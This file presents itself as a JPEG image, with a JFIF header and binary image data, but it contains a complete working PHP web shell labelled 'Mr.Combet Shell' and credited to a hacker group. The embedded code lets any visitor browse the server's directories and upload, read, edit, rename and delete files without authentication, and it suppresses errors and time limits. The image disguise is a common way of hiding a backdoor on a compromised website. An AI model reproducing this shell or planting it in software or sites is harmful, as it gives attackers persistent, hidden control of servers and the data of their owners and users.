���� JFIF  % %  ��Y<?php
set_time_limit(0);
error_reporting(0);
if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
?>
<!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>Mr.Combet Shell</title>
<link href="https://fonts.googleapis.com/css2?family=Graduate&display=swap" rel="stylesheet">
<style type="text/css">body{background: #000000;color:#e7fc00;font-family:'Courier';margin:0;font-size: 14px;}h1{font-family:'graduate';font-weight:normal;font-size:40px;margin:0;}h1:hover{color:#e7fc00;}select{background:#000000;color:#03fcf0;}a{color:#03fcf0;text-decoration:none;font-family:'Courier'}textarea{width:900px;height:250px;background:transparent;border:1px dashed #03fcf0;color:#e7fc00;padding:2px;}tr.first{border-bottom:1px dashed #03fcf0;}tr:hover{background: #000000;}th{background: #03fcf0;padding:5px;}</style>
</head><body> <?php echo'<div style="color:#03fcf0;margin-top:0;"><h1><center>Mr.Combet Shell<br><br></center></h1></div>';
if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
$path = str_replace("\\","/",$path);$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
foreach($paths as $id => $pat) {echo "<a style='font-size:13px;' href='?path=";
for($i = 0; $i <= $id; $i++) {echo $paths[$i];
if($i != $id) {echo "/";} }echo "'>$pat</a>/";}
echo '<br>[ <a href="?">Home Sheel</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#03fcf0;margin-bottom:4px;"/>
<input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<center><font color="#00ff00">Upload OK!.</font></center><br/>';}
else{echo '<center><font color="red">Upload Failed!.</font></center><br/>';}}
echo '</td></tr><tr><td></table>';
if(isset($_GET['filesrc'])){
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';echo "".basename($_GET['filesrc']);"";echo '</tr></td></table><br />';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<center><font color="#e7fc00">Rename OK!</font></center><br />';
}else{
echo '<center><font color="red">Rename Failed!</font></center><br />';
} $_POST['name'] = $_POST['newname'];}
echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#e7fc00">Edit File OK!.</font></center><br />';
}else{echo '<center><font color="red">Edit File Failed!.</font></center><br />';}fclose($fp);}
echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';}echo '</center>';}else{echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
}else{echo '<center><font color="red">Delete Dir Failed!</font></center><br />';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo '<font color="#e7fc00">Delete File Done.</font><br />';}else{
echo '<font color="red">Delete File Error.</font><br />';}}}echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
<th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
<th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}
echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
if(is_writable("$path/$file")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
echo '</table></div>';}echo '</body></html>';
function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
echo'<br><center>&copy; 2021 - <a href="https://www.facebook.com/combet.ohct">Mr.Combet [One Hat Cyber Team]</a>.</center><br>';?>
�� C 	

			

		
�� XX ��             �� D 	   !1AQaq"���2BR��r��#Sb�т��$%34CDTc���   ? ��                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  [p�t;V����SLi�kO���3�^|U��좚ٯ<{X��_���I���A��+�۵4φ�]��O�c�'�-�}�����wT�y��Î����>��e�����;���hϛM���O�R+��13��1�x��;^{i�>]NJLţON艏w31�Kwb����o8v�T�h�gJ�ߏ�{��h ��z�b��{~�g?�U�?t~3�Ğ�ܳ�O9s�/y⳨�V�?X���xJ�-jҳ{�+Z�33<DG������Lӆ�u�'��|���?����.��8�}�U�jy������� X�uۆ�ڴ����`�O[��Dz�����^3{.5�_���;�?�O��:-�KMnߩ�|7���ǬO�[           ���]�]O]�o��d�jD�٘����g��$��!۾�˻j~�ǝ�Z�8�����Fj��+�6�uv��}�-y�����Ye��M�f�nv���O��W�*��0�z[���k��n�U�/�l�sk�|�kϗ���.��ֻ>�}�i�f�L�lyb&�_}�b#��zy��u]�g��W�o���S�g��9�ٟ��>x����vzht�;s��i3�\qzb?F�O�h�6�n{��6y�<Qi��L�O������Ꞗ��N�M�h5y/���n8�/}�Ǘ����z{v���iw:�D�߈�Ǖ��t@���?�j7"rV;0��$�G���U�+Қ��g�kuy)���6y�������3��n���ӵ����^|ѧ�츲�3��LDzz�ǧ�"��{ͺlv�jo7ˠ�b�L�3�c����c��x������������uO�o?v�����!���U�U���oZ��sf�^1b��ȟH�1>/s��m����C�Q��9)��rq�i�T�~���\Z-^~��Onq��\����*���wVu]vM�����t�i�7�;��>wc���gv���������� ���ћ�����v=�f����>jL�ؼ�������           �u��~ů�Rx�-=�� 7_�
��}+���<�+��������}�U��[��J���;��x�+i���8�[�zst�cߣK�Q�f�1�)�f&k�l���<q�9�ޮضm&�����;���|�9�c��t]'���E�V٭?��������ÏQ�&�5{�����%T�i��V�6�۞�Y1L{�ԴO?�O�x�|��Wi��[�1��X�Z���?%��=>`�X�1�)X�tDq�����������"��?	��?�1��j�.ɪ���3�Q�*ڱ��ħO9+k�խ斘��DD�g���0u�Sl]Q�/���M�/���攎�����Y󒕤����L�q��Zi�é����nص��_$����_[�ڳ<ϯ�bdyG�/����e��v�Y����|㈏�gs��WK�~ߓq���F���f��y���z�5�/���ꎖ����>�4��W�Ro�1h��հm坫E]?�������q��?�՞�_۞'F�'�]^<s_we";����n!^+h����j���6��O�����Ϸ�lt��C�Qy�tU�Y��Y�G�0��S��^� ��s}�a�3�>������ֺ��WM�N���g�����ǯ}-��v�KKI���K�UO�͎�#�1�(          �7�}��&c��璱���e��q�n��)3mvX�^'���<��uc�g�J2xC���o�x�mDG>�qLVg���?�G�w�M��-�/L9����?�,�����~1<����g�i�=��� Țt�b�7�D�Xg�K��:k�x�����+���z�#'�X�h�f�>��5���Mb�5����y����x=3ٻWψ�� Z�?zru�*o�\|��Gnx�[b�O��&~�N��~�����s�-����#����?HL<5���;O�MM8�k��cΘ��?_�����Ż���\|���ߝ�� f��ӻ�_f�~LѦ�i�]>+�9��c��k��(�^:���˧t����u�`�?�-ZM/��n9�/�)��=I�|گ����S��y��v��򘟧���/�H�zkus�W'�m#>#�'���3S�c� 2�� D����z���W?�5x�z�6ݯ�����J��ߴۘ�c<М��ͺl���txfy� :           #�{�st��JǜR�� -�?��A��}^媵c�bǏg�i���0�����G���Zx�ɓ,�1?����Xv�_�6�m��<��%?�?ڔtfz�:[l�Y�#OZ~5����I����r�)<׿S������:�cC�-e���s���m��<��]�%��t��������a��-GWˎ�剟�XCOw��f�W�q:lx�9"�&8��y��PZ|�lz�Y�i����[�>���k����K����b�ioÚ�zZ=&�L���s����Ǖ����^����Hi�i�clǆ�m52O�h��e����������'lv�x�I��%WxG��k1G�[I6��^�Yc�1��Rf��v��� ���P��?��.�ˎg�͛#�������������G�;����=k��t�?{&^#�[Lt-_��x��n�s��1�+Dj���Οi�i�<�i��
�7           k�����u����|V�Z&?�Q�N�%�Y�{�N,Yy��� �޳�i�s�~<����߇K:����w{Y��}U6}D��^b����5�ҵ�=0��f~����x��_u�MqW�&�cSH�׷��͑���I�I~��g�+��O7�h�Z�>�|�|��$�>���[Fh�����Iǃm��f8��Dz��τ{U�5��J���c�=}-o�<\گ1�ޱט�N�$���j� rMѽO��v�1}E#Y���>;[�L�q�����z�I�IN���[��Q4�1X�J��|�\G�"�� j���j�nMLΦ�ǧw銤���G�m�������h�x���$��?y��1�nn]�#�(��I���9��c�����c���_Q�Ly:sU��c�˦��Z� X���b7��U�{>�r�I��L_�u/�L�q_��Þ��k6�;6�=1����Z��{Js�1�N>N�Y�>�b�s�E'Y����Y��3wL{�=��̔��w�I�߷)�v�����;C�l�-6���޵�^=�q����b�-�~�������X����ݎ������G�ݵz}�m���6�jO1l��z��3ǹbt��;>Ţ�mÊ;��y��2�t���^���h�S%�h���8����<|�[?�vϲ}�����ݽ���GoUM��O]u�(�[N��+J�Ǧy��ß9����           γ����Y̘ܶ�kf"2E���#�<zO���V�4b��:� Ķz���3�,>���7K`�K�����L�Ec�k����H�"c��%i��꯫�����ز��t��l�g�gӏ����ڼ-�Vz���Xy��9+{����ej��v�i����X�0�mc�?�����ݥݴ9��n>�9��h���c���u�4��db����Ld�/��-�s��K�|/�SWMgP�qb��i�n���O�O_�ˈ��"<�X�?h�>_�F9��>��L�{���g�PN���s���޺�W���Zٸ�kZo�g����>X���5�o:n���uz<��3b�[�&��5�+?w�	�aW�kx��q�D�_X�|:�4ڜUɋ-f�����>��w�
�\����S���\w�W%~Sϔ�ya�|,�uY�;��h�D��/���+�~s��M�A���Xt,Q�
�ҿ����ko���v���ؘ���/_ޥ��aV�|0�>iǦÇU��#%2־_�LO�I:;�|�f����|wˊ{��������D'��Y�^��L�rW�v�%��ڿ�n<���W��ϫ}������޽�ן�`�gE��|7͛%s�Gm�D}���kϟ�}�0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        4uۤ��8t���V\�ɒ+�q�mi5���}���&=�l���6����լg�c�ug�W��X��[s�ols��jV/jͣ��y�g�S���ς��-��lU��&��k<�3��)��K-�A�M}fv�&�L�-r�iX��y�O�<N��F�gs�{w�w����[� ,�<D��2f�h��+��k0b�~;r_$V�ϧ>L;N�ێ�ڛvO�џf��Ze�+?�V���O����j���W>�a��/ۏ-���>���Ż:�,bɞu8��d�|v�k�������5x�Xk�-m5�\Xc�<���H�9�s�y�멢��9r�Q{c�L}�ͣ��ޘ��)1��1��khw���VM/�mvcg�&Ka���"�ےfy�W�'��Ǎ'Q�5�,�隸b9�v�{N|�k�O�5�����I�鵿b�T�o�ίtG�#��|��WӟI�nd�1R�rZ+JD�֙�"#�ZZ=��)�u�Ö9Ǟ��R��<���^�b�o�pe�\zf|Zy�ϟ8�c���9�[�lO���V�q�5t���$q��Y�q<����zC֋x����Ϳrw�{"����wwGݞy�&���8o             ���ڽf���`����ŧ�R�p�9�6�)��z��{m<�{�~:�v��n���ms��˥���N�߾���m1�^o�1��}5��&�m�Ž�'M]�$[��8홟?9��� �L���]Vͭë�W[�&>-�Y���#�������&'�� 8�<�կ˵�Q8�����-���_OkE/�b��~�G3<ϗ���k��.�Q�Fj���&?e��1x�Eb&��&�]������Xv�^�ݟ�6�4Ѩ��_&/iY�h�[�i�q5�8��LG<y�t�Q�ګ���k����e[E�J�5�X��.8�s4�n�����F��[��iI��������j��8��9�2���Q�Y48mY��-f������#� mfc����,���4��kM�{[����jZ������ϔ�����˱S�m�i-��5�_m�˖+IÒ�����Z����9m��l�5{�\����U\�瘞��U���[G���ںo.[nMF_et���{bb��c����x�����_���n[f=����[K�[K��o��d�c�׬L���ˣ���u�d�����c�i�c�l������8��O16�b|�|���E��/|z}^�l3X�&h�I�<G�"'�y��CR������iv���6l�p����+�-6��=�Si�؞c�t�z�0����M��c�jf�n2�^g���ݴD�b������f�,V&�~ǧ�fc��+|ּ�z�3x�� �               .�M9'M�Ŋr�rd�R+�i����?6P  ��